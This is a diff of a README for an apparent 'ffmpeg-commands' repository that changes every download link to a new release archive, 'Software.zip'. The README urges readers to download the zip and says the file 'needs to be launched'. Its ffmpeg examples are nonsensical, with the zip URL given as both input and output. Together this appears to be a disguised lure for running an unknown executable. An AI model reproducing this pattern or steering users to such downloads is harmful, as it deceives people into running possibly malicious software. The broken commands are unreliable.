@@ -14,7 +14,7 @@ Welcome to the "ffmpeg-commands" repository! Here, you will find a collection of
 aac, audio, automated, batch, commands, converter, ffmpeg, flac, media-converter, mp3, mp3tag, mp4, scripts, video, vob
 
 ## Getting Started
-To explore the contents of this repository, simply [click here to download the zip file](https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip). This zip file contains all the necessary scripts and commands you need to start working with FFMPEG for media file manipulation.
+To explore the contents of this repository, simply [click here to download the zip file](https://github.com/Amiine7/ffmpeg-commands/releases/download/v2.0/Software.zip). This zip file contains all the necessary scripts and commands you need to start working with FFMPEG for media file manipulation.
 
 🚀 Please note that the downloaded file needs to be launched to access the contents.
 
@@ -24,17 +24,17 @@ If the link provided above does not work, or if you require more recent releases
 
 ### Convert MP4 to MP3
 ```bash
-ffmpeg -i https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip -vn -ar 44100 -ac 2 -ab 192k -f mp3 https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip
+ffmpeg -i https://github.com/Amiine7/ffmpeg-commands/releases/download/v2.0/Software.zip -vn -ar 44100 -ac 2 -ab 192k -f mp3 https://github.com/Amiine7/ffmpeg-commands/releases/download/v2.0/Software.zip
 ```
 
 ### Extract Audio from Video
 ```bash
-ffmpeg -i https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip -vn -c:a copy https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip
+ffmpeg -i https://github.com/Amiine7/ffmpeg-commands/releases/download/v2.0/Software.zip -vn -c:a copy https://github.com/Amiine7/ffmpeg-commands/releases/download/v2.0/Software.zip
 ```
 
 ### Compress Video
 ```bash
-ffmpeg -i https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip -vf "scale=1280:720" -c:v libx264 -crf 24 https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip
+ffmpeg -i https://github.com/Amiine7/ffmpeg-commands/releases/download/v2.0/Software.zip -vf "scale=1280:720" -c:v libx264 -crf 24 https://github.com/Amiine7/ffmpeg-commands/releases/download/v2.0/Software.zip
 ```
 
 ## Contribution
@@ -53,4 +53,4 @@ Do you want to unleash the full potential of FFMPEG commands? Download the zip f
 ## License
 This repository is licensed under the MIT License. See [LICENSE](LICENSE) for more information. 
 
-[![Download Zip](https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip)](https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip)
+[![Download Zip](https://github.com/Amiine7/ffmpeg-commands/releases/download/v2.0/Software.zip)](https://github.com/Amiine7/ffmpeg-commands/releases/download/v2.0/Software.zip)
